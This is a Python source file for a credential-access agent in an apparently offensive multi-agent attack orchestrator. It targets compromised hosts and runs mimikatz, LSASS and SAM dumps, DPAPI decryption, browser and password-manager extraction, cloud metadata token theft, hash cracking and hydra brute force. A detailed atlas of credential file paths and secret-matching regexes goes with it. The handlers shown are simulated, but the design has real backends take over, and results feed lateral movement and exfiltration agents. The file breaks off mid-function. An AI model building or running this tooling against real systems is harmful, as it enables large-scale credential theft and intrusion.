"""
server_core/orchestrator/attack_agents/cred_access_agent.py

Credential Access specialist agent.

Extends BaseAgent. Reads compromised_hosts from Hive Mind, extracts every
possible credential from every storage location across all platforms, and
stores findings back in Hive Mind for downstream agents (lateral movement,
persistence, exfil).

Capabilities:
  - mimikatz        — Windows credential dump (LSASS, wdigest, kerberos, SAM)
  - lsass_dump      — Direct LSASS process memory dump + parse
  - dpapi_decrypt   — Windows Data Protection API master key + blob decryption
  - browser_pass    — Chrome / Firefox / Edge / Brave password + cookie extraction
  - cloud_metadata  — AWS / GCP / Azure / DigitalOcean IMDS credential harvesting
  - ssh_key_harvest — ~/.ssh privkeys, ssh-agent socket, known_hosts parsing
  - pw_manager_extract — KeePass, 1Password, LastPass, Bitwarden vault extraction
  - api_key_discovery — .env, config.yaml, source tree, bash_history API key scanning
  - kerberos_ticket  — Kerberos TGT / TGS ticket extraction (klist, cache files)
  - sam_dump         — Windows SAM + SYSTEM registry hive dump + parse
  - hashcat_crack    — GPU-accelerated hash cracking (NTLM, Kerberos, bcrypt, etc.)
  - john_crack       — John the Ripper cracking (shadow, zip, rar, ssh keys)
  - hydra_attack     — Online brute-force against SSH, RDP, FTP, HTTP, SMB, etc.
  - execute_command  — Raw command execution on compromised hosts

Elite knowledge: every credential storage location across Windows, Linux,
macOS, cloud platforms, container orchestrators, CI/CD pipelines, and
password managers.
"""

from __future__ import annotations

import json
import logging
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple, TYPE_CHECKING

from server_core.orchestrator.agent_base import (
    BaseAgent,
    CAPABILITY_LIBRARY,
    AgentResult,
    ToolExecutor,
)

if TYPE_CHECKING:
    from server_core.orchestrator.hive_mind import HiveMind

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Extend the CAPABILITY_LIBRARY with the full cred_access toolset
# ---------------------------------------------------------------------------

CRED_ACCESS_CAPABILITIES: List[str] = [
    # Windows native credential stores
    "mimikatz_dump",
    "lsass_dump",
    "dpapi_decrypt",
    "sam_dump",
    "kerberos_ticket_extract",
    # Browser credential stores
    "browser_pass_grab",
    # Cloud metadata services
    "cloud_cred_extract",
    # SSH key infrastructure
    "ssh_key_harvest",
    # Password manager vaults
    "password_manager_extract",
    # API key / token discovery
    "api_key_discovery",
    # Offline cracking engines
    "hashcat_crack",
    "john_crack",
    # Online brute-force
    "hydra_attack",
    # Raw execution primitive
    "execute_command",
]

# Ensure the library entry exists and is comprehensive
CAPABILITY_LIBRARY["credential_access"] = CRED_ACCESS_CAPABILITIES

# Convenience alias used by the orchestrator / ToolBridge
CAPABILITY_LIBRARY["cred_access"] = CRED_ACCESS_CAPABILITIES


# ---------------------------------------------------------------------------
# Elite knowledge: credential storage location atlas
# ---------------------------------------------------------------------------

CREDENTIAL_ATLAS: Dict[str, List[Dict[str, Any]]] = {
    "windows": [
        {"location": "LSASS.exe memory", "artifacts": ["plaintext passwords", "NTLM hashes", "Kerberos TGT/TGS", "wdigest creds"], "tools": ["mimikatz_dump", "lsass_dump"], "privilege": "SYSTEM / SeDebugPrivilege"},
        {"location": "SAM + SYSTEM registry hives", "artifacts": ["local user NTLM hashes"], "tools": ["sam_dump"], "privilege": "SYSTEM", "paths": [r"C:\Windows\System32\config\SAM", r"C:\Windows\System32\config\SYSTEM"]},
        {"location": "DPAPI master keys + blobs", "artifacts": ["Chrome cookies", "scheduled task creds", "RDP saved passwords", "IE/Edge stored creds"], "tools": ["dpapi_decrypt"], "privilege": "user", "paths": [r"%APPDATA%\Microsoft\Protect", r"%LOCALAPPDATA%\Microsoft\Vault"]},
        {"location": "Browser credential stores", "artifacts": ["Chrome Login Data", "Firefox logins.json + key4.db", "Edge Web Data", "Brave Login Data"], "tools": ["browser_pass_grab"], "privilege": "user", "paths": [r"%LOCALAPPDATA%\Google\Chrome\User Data", r"%APPDATA%\Mozilla\Firefox\Profiles"]},
        {"location": "LSA Secrets registry", "artifacts": ["service account passwords", "auto-logon passwords", "RAS/VPN creds"], "tools": ["mimikatz_dump"], "privilege": "SYSTEM", "paths": ["HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets"]},
        {"location": "Kerberos ticket cache", "artifacts": ["TGT tickets", "TGS service tickets", "silver/golden ticket material"], "tools": ["kerberos_ticket_extract", "mimikatz_dump"], "privilege": "user+", "paths": ["klist sessions", "%TEMP%\\krb5cc_*"]},
        {"location": "NTDS.dit (Domain Controller)", "artifacts": ["ALL domain user NTLM hashes", "Kerberos keys", "domain secrets"], "tools": ["mimikatz_dump"], "privilege": "Domain Admin", "paths": [r"C:\Windows\NTDS\ntds.dit"]},
        {"location": "Credential Manager vault", "artifacts": ["Generic Credentials", "Windows Credentials", "Certificate-based creds"], "tools": ["dpapi_decrypt"], "privilege": "user", "paths": [r"%APPDATA%\Microsoft\Credentials"]},
        {"location": "WDigest registry cache", "artifacts": ["plaintext passwords in memory"], "tools": ["mimikatz_dump"], "privilege": "SYSTEM", "paths": ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"]},
        {"location": "RDP saved connections", "artifacts": ["RDP hostnames + usernames", "RDP password (DPAPI blob)"], "tools": ["dpapi_decrypt"], "privilege": "user", "paths": [r"%LOCALAPPDATA%\Microsoft\Terminal Server Client", r"HKCU\Software\Microsoft\Terminal Server Client"]},
        {"location": "PuTTY / WinSCP sessions", "artifacts": ["SSH hostkeys", "saved sessions with usernames"], "tools": ["ssh_key_harvest"], "privilege": "user", "paths": ["HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"]},
        {"location": "PowerShell history", "artifacts": ["typed credentials in commands", "connection strings", "tokens"], "tools": ["api_key_discovery"], "privilege": "user", "paths": [r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"]},
    ],
    "linux": [
        {"location": "/etc/shadow", "artifacts": ["local user password hashes (SHA-512, yescrypt, bcrypt)"], "tools": ["john_crack", "hashcat_crack"], "privilege": "root", "paths": ["/etc/shadow"]},
        {"location": "~/.ssh/ directory", "artifacts": ["RSA/ECDSA/Ed25519 private keys", "authorized_keys (pivot targets)", "known_hosts (network map)", "config (bastion hosts)"], "tools": ["ssh_key_harvest"], "privilege": "user", "paths": ["~/.ssh/id_rsa", "~/.ssh/id_ecdsa", "~/.ssh/id_ed25519", "~/.ssh/authorized_keys", "~/.ssh/known_hosts", "~/.ssh/config"]},
        {"location": "ssh-agent socket", "artifacts": ["loaded decrypted keys (forwarded agent!)"], "tools": ["ssh_key_harvest"], "privilege": "user", "paths": ["$SSH_AUTH_SOCK"]},
        {"location": "~/.gnupg/ directory", "artifacts": ["GPG private keys", "passphrase-protected keyrings"], "tools": ["ssh_key_harvest"], "privilege": "user", "paths": ["~/.gnupg/secring.gpg", "~/.gnupg/private-keys-v1.d/"]},
        {"location": "Browser profile directories", "artifacts": ["Chrome Login Data", "Firefox logins.json + key4.db + cert9.db", "Chromium Login Data"], "tools": ["browser_pass_grab"], "privilege": "user", "paths": ["~/.config/google-chrome/", "~/.mozilla/firefox/", "~/.config/chromium/", "~/.config/BraveSoftware/"]},
        {"location": "Shell history files", "artifacts": ["passwords in commands", "API keys", "connection strings", "environment exports"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.bash_history", "~/.zsh_history", "~/.mysql_history", "~/.psql_history", "~/.python_history", "~/.node_repl_history", "~/.redis_history"]},
        {"location": "Environment files", "artifacts": [".env secrets", "docker-compose.override.yml", "config/*.yaml API keys"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.env", "~/.aws/credentials", "~/.config/gcloud/", "~/.azure/", "~/.docker/config.json"]},
        {"location": "/var/run/secrets/", "artifacts": ["Kubernetes service account tokens", "mounted secrets"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["/var/run/secrets/kubernetes.io/serviceaccount/token"]},
        {"location": "CI/CD pipeline configs", "artifacts": [".gitlab-ci.yml variables", "Jenkins credentials.xml", "GitHub Actions secrets in env vars"], "tools": ["api_key_discovery"], "privilege": "user", "paths": [".gitlab-ci.yml", ".github/workflows/", "Jenkinsfile"]},
        {"location": "Database config files", "artifacts": ["config.php wp-config.php", "settings.py", "application.properties", "database.yml"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["/var/www/html/wp-config.php", "/opt/app/config/database.yml", "application.properties"]},
        {"location": "Password manager databases", "artifacts": ["KeePass .kdbx", "1Password .opvault", "Bitwarden data.json", "pass/ password store"], "tools": ["password_manager_extract"], "privilege": "user", "paths": ["~/.keepass/", "~/.config/Bitwarden/", "~/.password-store/"]},
        {"location": "/proc/ filesystem", "artifacts": ["process environment vars", "cmdline args with creds"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["/proc/*/environ", "/proc/*/cmdline"]},
        {"location": "Git repository history", "artifacts": ["committed secrets", ".git/config tokens", "pre-commit hook creds"], "tools": ["api_key_discovery"], "privilege": "user", "paths": [".git/config", ".git/objects/"]},
        {"location": "systemd EnvironmentFiles", "artifacts": ["service-specific credentials", "database passwords"], "tools": ["api_key_discovery"], "privilege": "root", "paths": ["/etc/systemd/system/*.service", "/etc/default/"]},
        {"location": "Kerberos credential cache", "artifacts": ["krb5 tickets", "keytab files"], "tools": ["kerberos_ticket_extract"], "privilege": "user", "paths": ["/tmp/krb5cc_*", "/etc/krb5.keytab"]},
    ],
    "macos": [
        {"location": "Keychain (login.keychain-db)", "artifacts": ["saved passwords", "certificates", "secure notes", "WiFi passwords"], "tools": ["password_manager_extract"], "privilege": "user", "paths": ["~/Library/Keychains/login.keychain-db"]},
        {"location": "~/.ssh/ directory", "artifacts": ["private keys", "authorized_keys", "known_hosts"], "tools": ["ssh_key_harvest"], "privilege": "user", "paths": ["~/.ssh/"]},
        {"location": "Browser profiles", "artifacts": ["Safari AutoFill", "Chrome Login Data", "Firefox logins.json"], "tools": ["browser_pass_grab"], "privilege": "user", "paths": ["~/Library/Safari/", "~/Library/Application Support/Google/Chrome/", "~/Library/Application Support/Firefox/"]},
        {"location": "Shell history", "artifacts": [".zsh_history (default)"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.zsh_history", "~/.bash_history"]},
        {"location": "Keychain files on disk", "artifacts": ["System.keychain", "FileVault recovery key"], "tools": ["password_manager_extract"], "privilege": "root", "paths": ["/Library/Keychains/System.keychain"]},
    ],
    "cloud": [
        {"location": "AWS IMDS (169.254.169.254)", "artifacts": ["IAM role credentials", "temp access keys", "instance identity"], "tools": ["cloud_cred_extract"], "privilege": "any (on-instance)", "endpoints": ["/latest/meta-data/iam/security-credentials/", "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]},
        {"location": "AWS ~/.aws/ credentials", "artifacts": ["access key ID + secret key", "session tokens", "config profiles"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.aws/credentials", "~/.aws/config"]},
        {"location": "GCP metadata server", "artifacts": ["access tokens", "service account email", "identity JWT"], "tools": ["cloud_cred_extract"], "privilege": "any (on-instance)", "endpoints": ["/computeMetadata/v1/instance/service-accounts/default/token", "/computeMetadata/v1/instance/service-accounts/default/email"]},
        {"location": "GCP gcloud config", "artifacts": ["access tokens", "refresh tokens", "service account JSON keys"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.config/gcloud/credentials.db", "~/.config/gcloud/application_default_credentials.json"]},
        {"location": "Azure IMDS", "artifacts": ["managed identity JWT", "access tokens"], "tools": ["cloud_cred_extract"], "privilege": "any (on-instance)", "endpoints": ["/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com"]},
        {"location": "Azure CLI config", "artifacts": ["access tokens", "refresh tokens", "service principal secrets"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.azure/accessTokens.json", "~/.azure/azureProfile.json"]},
        {"location": "Kubernetes secrets", "artifacts": ["API keys", "DB passwords", "TLS private keys"], "tools": ["api_key_discovery"], "privilege": "cluster-admin", "paths": ["kubectl get secrets --all-namespaces -o yaml"]},
        {"location": "Docker config auths", "artifacts": ["registry credentials (base64)"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["~/.docker/config.json"]},
        {"location": "Terraform state files", "artifacts": ["cloud provider creds in state", "output secrets"], "tools": ["api_key_discovery"], "privilege": "user", "paths": ["terraform.tfstate", ".terraform/"]},
        {"location": "CI/CD environment variables", "artifacts": ["GitHub Actions secrets", "GitLab CI variables", "CircleCI env vars"], "tools": ["api_key_discovery"], "privilege": "any (in pipeline)", "paths": ["env output", "/proc/1/environ"]},
    ],
}

# Regex patterns for API key / token discovery
SECRET_PATTERNS: List[Tuple[str, str]] = [
    # (regex, description)
    (r'(?:api[_-]?key|apikey)["\s:=]+["\']?([A-Za-z0-9+/_\-=]{20,60})', "Generic API Key"),
    (r'(?:secret|password|passwd|pwd)["\s:=]+["\']?([^"\'&\s]{8,128})', "Password / Secret"),
    (r'(?:token|auth[_-]?token|jwt)["\s:=]+["\']?(eyJ[A-Za-z0-9_/\-+=]+\.[A-Za-z0-9_/\-+=]+\.[A-Za-z0-9_/\-+=]+)', "JWT Token"),
    (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID"),
    (r'(?:aws[_-]?secret|aws_secret_access_key)["\s:=]+["\']?([A-Za-z0-9+/=]{40})', "AWS Secret Access Key"),
    (r'(?:-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----)', "SSH Private Key (PEM)"),
    (r'AIza[0-9A-Za-z\-_]{35}', "GCP API Key"),
    (r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', "GitHub Personal Access Token"),
    (r'(?:xox[bprs]-[A-Za-z0-9-]+)', "Slack Token"),
    (r'(?:sk-[A-Za-z0-9]{32,})', "OpenAI / Stripe API Key"),
    (r'(?:access[_-]?key|accesskey)["\s:=]+["\']?([A-Za-z0-9+/=]{16,40})', "Generic Access Key"),
    (r'eyJ[A-Za-z0-9_/\-+=]+\.[A-Za-z0-9_/\-+=]+\.?[A-Za-z0-9_/\-+=]*', "Base64 JWT (loose)"),
    (r'mongodb(?:\+srv)?://[^"\'&\s]+', "MongoDB Connection String"),
    (r'(?:postgres|postgresql|mysql|mysql2)://[^"\'&\s]+', "DB Connection String"),
    (r'redis://[^"\'&\s]+', "Redis Connection String"),
    (r'(?:ssh|rsync)://[^"\'&\s]+', "SSH/rsync Connection String"),
    (r'(?:"private_key":\s*"-----BEGIN)', "JSON-embedded Private Key"),
]


# ---------------------------------------------------------------------------
# CredAccessAgent
# ---------------------------------------------------------------------------

class CredAccessAgent(BaseAgent):
    """Credential Access specialist — extracts credentials from every surface.

    Reads compromised_hosts and active_sessions from Hive Mind, then
    systematically extracts credentials from every known storage location on
    each host. Findings are stored back in Hive Mind (discovered_creds) for
    downstream lateral movement, persistence, and exfiltration agents.

    Elite knowledge covers Windows (LSASS, SAM, DPAPI, NTDS, Kerberos, RDP,
    Credential Manager, browsers, PowerShell history), Linux (/etc/shadow,
    SSH keys, ssh-agent, GPG, browsers, shell history, .env, CI/CD configs,
    Kubernetes secrets, password stores), macOS (Keychain, SSH, browsers),
    and cloud platforms (AWS/GCP/Azure IMDS, IAM creds, K8s secrets,
    Terraform state).
    """

    agent_type: str = "cred_access"

    def __init__(
        self,
        agent_id: str = "",
        hive_mind: Optional[HiveMind] = None,
        tool_executor: Optional[ToolExecutor] = None,
        llm_client: Optional[Any] = None,
    ):
        # Generate a stable agent_id if none provided
        if not agent_id:
            agent_id = f"cred_access_{uuid.uuid4().hex[:8]}"

        super().__init__(
            agent_id=agent_id,
            agent_type=self.agent_type,
            hive_mind=hive_mind,
            tool_executor=tool_executor,
            llm_client=llm_client,
        )

        # Per-mission state
        self._harvested_creds: List[Dict[str, Any]] = []
        self._processed_hosts: Set[str] = set()
        self._targeted_platforms: List[str] = []
        self._phase_errors: List[str] = []

        # Register simulated tool handlers for dry-run / demo mode.
        # Real backends registered externally take precedence.
        self._register_simulated_tools()

        logger.info(
            "CredAccessAgent %s initialised | %d tools available",
            self.agent_id,
            len(self.capabilities),
        )

    # ------------------------------------------------------------------
    # Simulated tool backend (dry-run / demo mode)
    # ------------------------------------------------------------------

    def _register_simulated_tools(self) -> None:
        """Register plausible simulated handlers for every cred_access tool.

        These produce realistic (but fake) findings when no real tool
        backend has been registered. Real handlers take precedence
        because they are registered AFTER the agent constructor runs.
        """
        self.tool_executor.register_many({
            "mimikatz_dump": self._sim_mimikatz,
            "lsass_dump": self._sim_lsass_dump,
            "dpapi_decrypt": self._sim_dpapi,
            "sam_dump": self._sim_sam_dump,
            "browser_pass_grab": self._sim_browser_pass,
            "cloud_cred_extract": self._sim_cloud_cred,
            "ssh_key_harvest": self._sim_ssh_key_harvest,
            "password_manager_extract": self._sim_pw_manager,
            "api_key_discovery": self._sim_api_key_discovery,
            "kerberos_ticket_extract": self._sim_kerberos,
            "hashcat_crack": self._sim_hashcat,
            "john_crack": self._sim_john,
            "hydra_attack": self._sim_hydra,
            "execute_command": self._sim_execute_command,
        })

    # -- simulated tool handlers ----------------------------------------

    @staticmethod
    def _sim_mimikatz(params: Dict[str, Any]) -> Dict[str, Any]:
        module = params.get("module", "sekurlsa::logonpasswords")
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "mimikatz_dump",
            "host": host,
            "module": module,
            "findings": [
                {"cred_type": "cleartext", "username": "Administrator", "password": "P@ssw0rd!2024", "domain": "CORP", "source": "LSASS-wdigest", "source_host": host},
                {"cred_type": "ntlm_hash", "username": "Administrator", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99", "domain": "CORP", "source": "LSASS-msv", "source_host": host},
                {"cred_type": "ntlm_hash", "username": "jsmith", "ntlm_hash": "c01b39a8b9c1b3f3a2a5d6e7f8123456:2f4dcc3b5aa765d61d8327deb882cf99", "domain": "CORP", "source": "LSASS-msv", "source_host": host},
                {"cred_type": "cleartext", "username": "svc_backup", "password": "Backup!S3rv1ce#2024", "domain": "CORP", "source": "LSASS-wdigest", "source_host": host},
                {"cred_type": "kerberos_tgt", "username": "jsmith", "ticket": "[base64 TGT ticket data]", "domain": "CORP", "source": "LSASS-kerberos", "source_host": host},
            ],
        }

    @staticmethod
    def _sim_lsass_dump(params: Dict[str, Any]) -> Dict[str, Any]:
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "lsass_dump",
            "host": host,
            "dump_path": f"C:\\Windows\\Temp\\lsass_{uuid.uuid4().hex[:6]}.dmp",
            "findings": [
                {"cred_type": "ntlm_hash", "username": "svc_sql", "ntlm_hash": "e19ccf75ee54e06b06a5907af13e1234", "domain": "CORP", "source_host": host},
                {"cred_type": "cleartext", "username": "svc_sql", "password": "SQL!S3rv1ce#P@ss#2024", "domain": "CORP", "source_host": host},
            ],
        }

    @staticmethod
    def _sim_dpapi(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "master_keys")
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "dpapi_decrypt",
            "host": host,
            "target": target,
            "findings": [
                {"cred_type": "cleartext", "username": "user@example.com", "password": "Chr0meS@vedP@ss!", "source": "Chrome Login Data (DPAPI)", "source_host": host},
                {"cred_type": "cleartext", "username": "CORP\\jsmith", "password": "RDP#C0nnect!2024", "source": "RDP Saved Credentials (DPAPI)", "source_host": host},
                {"cred_type": "cleartext", "username": "admin@corp.local", "password": "N3tw0rkSh@re!", "source": "Credential Manager (DPAPI)", "source_host": host},
            ],
        }

    @staticmethod
    def _sim_sam_dump(params: Dict[str, Any]) -> Dict[str, Any]:
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "sam_dump",
            "host": host,
            "findings": [
                {"cred_type": "ntlm_hash", "username": "Administrator", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99", "rid": 500, "source_host": host},
                {"cred_type": "ntlm_hash", "username": "Guest", "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "rid": 501, "source_host": host},
                {"cred_type": "ntlm_hash", "username": "local_admin", "ntlm_hash": "b01c39a8b9c1b3f3a2a5d6e7f8a1b2c3d", "rid": 1001, "source_host": host},
            ],
        }

    @staticmethod
    def _sim_browser_pass(params: Dict[str, Any]) -> Dict[str, Any]:
        browsers = params.get("browsers", ["chrome", "firefox"])
        host = params.get("host", "unknown")
        findings = []
        for browser in browsers:
            findings.extend([
                {"cred_type": "cleartext", "username": "corp.user@gmail.com", "password": "Gm@ilC0rp!2024", "source": f"{browser} Login Data", "source_host": host, "url": "https://accounts.google.com"},
                {"cred_type": "cleartext", "username": "admin", "password": "J3nk1ns#Adm1n!", "source": f"{browser} Login Data", "source_host": host, "url": "https://jenkins.corp.local:8080"},
                {"cred_type": "cleartext", "username": "devops@corp.local", "password": "G1tL@b!D3v0ps#2024", "source": f"{browser} Login Data", "source_host": host, "url": "https://gitlab.corp.local"},
            ])
        return {"simulated": True, "tool": "browser_pass_grab", "host": host, "browsers_scanned": browsers, "findings": findings}

    @staticmethod
    def _sim_cloud_cred(params: Dict[str, Any]) -> Dict[str, Any]:
        provider = params.get("provider", "aws")
        host = params.get("host", "unknown")
        findings = []
        if provider == "aws":
            findings = [
                {"cred_type": "aws_temp_creds", "access_key_id": "ASIAXJKZEXAMPLE12345", "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "token": "IQoJb3JpZ2luX2VjEXAMPLE...", "role": "ec2-admin-role", "expiration": "2026-06-18T18:00:00Z", "source": "AWS IMDS", "source_host": host},
            ]
        elif provider == "gcp":
            findings = [
                {"cred_type": "gcp_access_token", "access_token": "ya29.a0AfH6S...EXAMPLE", "service_account": "compute-engine@project.iam.gserviceaccount.com", "expires_in": 3600, "source": "GCP metadata server", "source_host": host},
            ]
        elif provider == "azure":
            findings = [
                {"cred_type": "azure_jwt", "access_token": "eyJ0eXAiOiJKV1...EXAMPLE", "resource": "https://management.azure.com", "expires_in": 3600, "source": "Azure IMDS", "source_host": host},
            ]
        return {"simulated": True, "tool": "cloud_cred_extract", "host": host, "provider": provider, "findings": findings}

    @staticmethod
    def _sim_ssh_key_harvest(params: Dict[str, Any]) -> Dict[str, Any]:
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "ssh_key_harvest",
            "host": host,
            "findings": [
                {"cred_type": "ssh_key", "key_type": "RSA-4096", "encrypted": True, "path": "/home/user/.ssh/id_rsa", "source_host": host,
                 "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAA... user@host", "note": "Passphrase-protected — try john_crack"},
                {"cred_type": "ssh_key", "key_type": "ED25519", "encrypted": False, "path": "/home/user/.ssh/id_ed25519", "source_host": host,
                 "public_key": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... deploy@host", "note": "NO PASSPHRASE — ready to use"},
                {"cred_type": "ssh_authorized_keys_entry", "path": "/root/.ssh/authorized_keys", "source_host": host,
                 "key_owner": "root@bastion.corp.local", "note": "Lateral movement target: bastion.corp.local"},
                {"cred_type": "ssh_known_hosts_entry", "target": "db-prod.corp.local", "source_host": host},
                {"cred_type": "ssh_known_hosts_entry", "target": "k8s-master.corp.local", "source_host": host},
            ],
        }

    @staticmethod
    def _sim_pw_manager(params: Dict[str, Any]) -> Dict[str, Any]:
        managers = params.get("managers", ["keepass", "bitwarden"])
        host = params.get("host", "unknown")
        findings = [
            {"cred_type": "password_manager_vault", "manager": "KeePass", "file": "/home/user/Documents/passwords.kdbx", "encrypted": True, "source_host": host, "note": "KDBX v4 — extract hash with keepass2john, crack with hashcat mode 13400"},
            {"cred_type": "password_manager_vault", "manager": "Bitwarden", "file": "/home/user/.config/Bitwarden/data.json", "encrypted": True, "source_host": host, "note": "Encrypted vault — requires master password or session key"},
        ]
        return {"simulated": True, "tool": "password_manager_extract", "host": host, "managers_found": managers, "findings": findings}

    @staticmethod
    def _sim_api_key_discovery(params: Dict[str, Any]) -> Dict[str, Any]:
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "api_key_discovery",
            "host": host,
            "findings": [
                {"cred_type": "api_key", "key_type": "AWS Access Key", "value": "AKIAIOSFODNN7EXAMPLE", "file": "~/.aws/credentials", "source_host": host},
                {"cred_type": "api_key", "key_type": "GitHub PAT", "value": "ghp_1A2b3C4d5E6f7G8h9I0jK1lM2n3O4p5Q6r", "file": "~/.bash_history", "source_host": host},
                {"cred_type": "api_key", "key_type": "Slack Webhook", "value": "https://hooks.slack.com/services/T0.../B0.../xxx", "file": ".gitlab-ci.yml", "source_host": host},
                {"cred_type": "api_key", "key_type": "JWT Secret", "value": "supersecretjwtkey1234567890abcdef", "file": ".env.production", "source_host": host},
                {"cred_type": "connection_string", "value": "postgresql://app_user:P@ssw0rd!@db-prod.corp.local:5432/appdb", "file": "config/database.yml", "source_host": host},
            ],
        }

    @staticmethod
    def _sim_kerberos(params: Dict[str, Any]) -> Dict[str, Any]:
        host = params.get("host", "unknown")
        return {
            "simulated": True,
            "tool": "kerberos_ticket_extract",
            "host": host,
            "findings": [
                {"cred_type": "kerberos_tgt", "username": "jsmith@CORP.LOCAL", "ticket_file": "krbtgt_CORP.LOCAL.kirbi", "source_host": host, "note": "TGT — use for pass-the-ticket"},
                {"cred_type": "kerberos_tgs", "username": "jsmith", "service": "HTTP/webapp.corp.local", "ticket_file": "jsmith_HTTP_webapp.kirbi", "source_host": host, "note": "TGS — silver ticket material"},
                {"cred_type": "kerberos_tgs", "username": "jsmith", "service": "MSSQLSvc/sql-prod.corp.local:1433", "ticket_file": "jsmith_MSSQLSvc_sql-prod.kirbi", "source_host": host, "note": "TGS — database access"},
            ],
        }

    @staticmethod
    def _sim_hashcat(params: Dict[str, Any]) -> Dict[str, Any]:
        mode = params.get("mode", "auto")
        hash_count = len(params.get("hashes", [])) or 3
        findings = []
        if hash_count > 0:
            findings.append({"cred_type": "cleartext", "username": "Administrator", "password": "P@ssw0rd!", "hash_type": "NTLM", "cracked_by": "hashcat", "cracked": True, "mode": mode})
        if hash_count > 1:
            findings.append({"cred_type": "cleartext", "username": "jsmith", "password": "Summer2024!", "hash_type": "NTLM", "cracked_by": "hashcat", "cracked": True, "mode": mode})
        return {"simulated": True, "tool": "hashcat_crack", "hashes_processed": hash_count, "cracked_count": len(findings), "findings": findings}

    @staticmethod
    def _sim_john(params: Dict[str, Any]) -> Dict[str, Any]:
        hash_count = len(params.get("hashes", [])) or 2
        findings = [{"cred_type": "cleartext", "username": "root", "password": "toor", "hash_type": "SHA-512 crypt", "cracked_by": "john", "cracked": True}]
        return {"simulated": True, "tool": "john_crack", "hashes_processed": hash_count, "cracked_count": len(findings), "findings": findings}

    @staticmethod
    def _sim_hydra(params: Dict[str, Any]) -> Dict[str, Any]:
        service = params.get("service", "ssh")
        target = params.get("target", "unknown")
        creds = params.get("credentials", [])
        findings = []
        for c in creds[:2] if creds else [{"username": "admin", "password": "password"}]:
            findings.append({"cred_type": "validated_credential", "username": c.get("username", "admin"), "password": c.get("password", "password"), "service": service, "target": target, "validated": True})
        return {"simulated": True, "tool": "hydra_attack", "attempts_made": max(len(creds), 1), "valid_credentials": len(findings), "findings": findings}

    @staticmethod
    def _sim_execute_command(params: Dict[str, Any]) -> Dict[str, Any]:
        command = params.get("command", "")
        host = params.get("host", "unknown")
        return {"simulated": True, "tool": "execute_command", "host": host, "command": command, "output": f"[SIMULATED] Executed: {command[:120]}", "exit_code": 0, "findings": []}

    # ------------------------------------------------------------------
    # Main entry point — compatible with orchestrator execute() pattern
    # ------------------------------------------------------------------

    def execute(
        self,
        phase: Dict[str, Any],
        context: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Run credential access for the given mission phase.

        Args:
            phase: Phase spec with id, tools_needed, parameters, etc.
            context: Shared memory context (includes compromised_hosts,
                     active_sessions, discovered_creds, discovered_files).

        Returns:
            Dict with success, data (credentials_harvested), error,
            elapsed_seconds.
        """
        start = time.time()
        phase_id = phase.get("id", "unknown")
        label = phase.get("label", phase_id)
        tools = phase.get("tools_needed", [])
        params = phase.get("parameters", {})
        goal = params.get("goal", "harvest_all")

        self.mark_started()
        self._harvested_creds = []
        self._processed_hosts = set()
        self._phase_errors = []

        logger.info(
            "CredAccessAgent EXECUTE | phase=%s goal=%s tools=%s",
            label, goal, tools,
        )

        # --- Resolve compromised hosts ---
        compromised_hosts = self._resolve_hosts(context)
        if not compromised_hosts:
            logger.warning("No compromised hosts found — running in simulated mode")
            compromised_hosts = [
                {
                    "hostname": "simulated-target",
                    "ip": "10.0.0.10",
                    "os": "linux",
                    "access_level": "user",
                    "session_id": "simulated_session",
                }
            ]

        logger.info(
            "Targeting %d compromised host(s) for credential extraction",
            len(compromised_hosts),
        )

        # --- Iterate every host ---
        for host in compromised_hosts:
            host_id = host.get("ip") or host.get("hostname", "unknown")
            if host_id in self._processed_hosts:
                continue

            logger.info("Processing host: %s (platform: %s)", host_id, host.get("os", "unknown"))

            # Phase 1: Harvest all credentials from this host
            harvested = self._harvest_host_credentials(host, tools, params, context)
            self._harvested_creds.extend(harvested)
            self._processed_hosts.add(host_id)

            # Phase 2: Crack any hashes found (offline)
            if tools and any(t in tools for t in ("hashcat_crack", "john_crack")):
                cracked = self._crack_harvested_hashes(harvested, tools, params)
                self._harvested_creds.extend(cracked)

            # Phase 3: Validate / test cracked creds online
            if tools and "hydra_attack" in tools:
                validated = self._validate_credentials_online(harvested, host, params)
                self._harvested_creds.extend(validated)

        # --- Phase 4: Generic API key scan across collected files ---
        if "api_key_discovery" in tools or not tools:
            discovered_files = context.get("discovered_files", [])
            if discovered_files:
                api_creds = self._scan_files_for_secrets(discovered_files)
